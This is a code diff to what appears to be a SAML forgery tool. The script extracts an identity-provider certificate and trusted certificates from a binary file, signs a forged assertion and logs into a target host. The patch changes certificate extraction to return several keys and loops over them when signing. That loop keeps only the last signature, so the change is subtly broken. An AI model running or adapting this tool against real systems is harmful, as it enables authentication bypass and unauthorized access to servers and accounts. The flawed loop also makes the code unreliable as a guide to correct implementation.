@@ -117,6 +117,7 @@ def check_key_valid(key, verbose=False):
 def get_idp_cert(stream, verbose=False):
     tup = stream.findall(idp_cert_flag, bytealigned=True)
     matches = list(tup)
+    keys = []
     for match in matches:
         stream.pos = match - 32
         flag = stream.read('bytes:3')
@@ -133,7 +134,9 @@ def get_idp_cert(stream, verbose=False):
                 continue
  
             print('[*] Successfully extracted the IdP certificate')        
-            return key
+            keys += [key]
+    if keys:
+        return keys
     else:
         print(f'[-] Failed to find the IdP certificate')
         sys.exit()
@@ -342,7 +345,7 @@ if __name__ == '__main__':
     # Extract certificates
     in_stream = open(argspath, 'rb')
     bin_stream = bitstring.ConstBitStream(in_stream)
-    idp_cert = get_idp_cert(bin_stream, argsverbose)
+    idp_certs = get_idp_cert(bin_stream, argsverbose)
     try:
         trusted_cert_1, domain = get_trusted_cert1(bin_stream, argsverbose)
     except:
@@ -378,7 +381,13 @@ ywn2KYen0leh9jHsJBtoLXs0s95wNkmHm4kGbI5SjwM=
     hostname = get_hostname(argstarget)
     req = saml_request(argstarget)
     t = fill_template(hostname, argstarget, domain,req)
-    s = sign_assertion(t, trusted_cert_1, trusted_cert_2, idp_cert)
-    c = login(argstarget, s)
+    for idp_cert in idp_certs:
+        s = sign_assertion(t, trusted_cert_1, trusted_cert_2, idp_cert)
+    if s:
+        c = login(argstarget, s)
+    else:
+        print(f'[-] Failed to sigh assertion')
+        sys.exit()
+    
 
 
